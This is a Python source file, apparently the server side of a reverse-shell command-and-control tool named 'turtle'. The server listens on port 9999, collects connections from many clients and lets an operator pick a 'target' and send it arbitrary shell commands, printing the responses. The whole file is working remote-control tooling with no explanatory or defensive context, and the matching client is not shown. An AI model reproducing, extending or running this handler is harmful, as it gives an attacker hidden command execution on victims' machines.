import socket
import time
import threading
from queue import Queue

NUM_OF_THREADS = 2
JOB_NUMBER = [1, 2]

QUEUE = Queue()
ALL_CONNECTIONS = []
ALL_ADDRESSES = []


# Create Socket
def SocketCreate():
	try:
		global Host
		global Port
		global Socket

		Host = ''  # Currently Using the Default IP
		Port = 9999  # Listening on this Port
		Socket = socket.socket()  # Creating a new Socket

	except socket.error as msg:
		print("Socket Creation Failed: " + str(msg))


# Binding Socket To The Port and Wait For Connection From Client
def SocketBind():
	try:
		global Host
		global Port
		global Socket

		# print("Binding The Socket to Port : " + str(Port))

		Socket.bind((Host, Port))
		Socket.listen(5)  # Accept 5 Connections

	except socket.error as msg:
		print("Socket Binding Error: " + str(msg) + "\n")
		time.sleep(5)
		SocketBind()


# Accept Connections from Multi Clients and Save to List
def AcceptConnections():
	# Close all Connections
	for connection in ALL_CONNECTIONS:
		connection.close()

	# Clear Lists
	del ALL_CONNECTIONS[:]
	del ALL_ADDRESSES[:]

	while 1:
		try:
			connection, address = Socket.accept()
			connection.setblocking(1)
			ALL_CONNECTIONS.append(connection)
			ALL_ADDRESSES.append(address)
			print("Connection has been Established With: " + address[0] + "\nturtle> ", end = '')
		except:
			print("Error Accepting Connections")


# Interactive Prompt For Sending Commands Remotely
def StartTurtle():
	print("Turtle Commands:\n"
	      "list - To List the Addresses of the Clients Connected to the Server\n"
	      "select i - To connect to the 'i' Specified Client ID, where 'i' is the ID of the Client i.e. 0\n"
	      "quit - To Quit the Connection to the Remote Client\n"
	      "\nUnique Client Commands (To be used when connected to a Client):\n"
	      "quit - To Quit the Connection to the Remote Client\n"
	      "any invalid input - To get the Basic OS Information about the client")
	while True:
		CMD = input("\nturtle> ")

		if CMD == 'list':
			ListConnections()
		elif 'select' in CMD:
			connection = GetTarget(CMD)
			if connection is not None:
				SendTargetCommands(connection)
			else:
				print("Command not Recognized")


# Display all the Current Connections
def ListConnections():
	results = ''
	for i, connection in enumerate(ALL_CONNECTIONS):
		try:
			# Test Connection is Valid
			connection.send(str.encode(' '))
			connection.recv(20480)
		except:
			del ALL_CONNECTIONS[i]
			del ALL_ADDRESSES[i]
			continue
		# Index : IP Address Port
		results += "Client ID : " + str(i) + ', Client IP : ' + str(
			ALL_ADDRESSES[i][0] + ' , PORT : ' + str(ALL_ADDRESSES[i][1]) + '\n')
	print('--- CLIENTS ---' + '\n' + results)


# Get A Client Target
def GetTarget(CMD):
	try:
		target = CMD.replace('select ', '')
		target = int(target)
		connection = ALL_CONNECTIONS[target]
		print("You are Connected to " + str(ALL_ADDRESSES[target][0]))
		print(str(ALL_ADDRESSES[target][0]) + '> ', end = "")
		return connection
	except:
		print("Not a Valid Selection")
		return None


# Connect with Remote Target Client
def SendTargetCommands(connection):
	while True:
		try:
			CMD = input()
			if len(str.encode(CMD)) > 0:
				connection.send(str.encode(CMD))
				clientResponse = str(connection.recv(20480), 'utf-8')
				print(clientResponse, end = "")
			if CMD == 'quit':
				break
		except:
			print("Connection was Lost")
			break


# Create Worker Threads
def CreateWorkers():
	for _ in range(NUM_OF_THREADS):
		t = threading.Thread(target = Work)
		t.daemon = True
		t.start()


# Do the Next Job in the QUEUE (1 : Handles Connection; 2 : Send Commands
def Work():
	while True:
		x = QUEUE.get()

		if x == 1:
			SocketCreate()
			SocketBind()
			AcceptConnections()

		if x == 2:
			StartTurtle()

		QUEUE.task_done()


def CreateJobs():
	for x in JOB_NUMBER:
		QUEUE.put(x)
	QUEUE.join()


CreateWorkers()
CreateJobs()
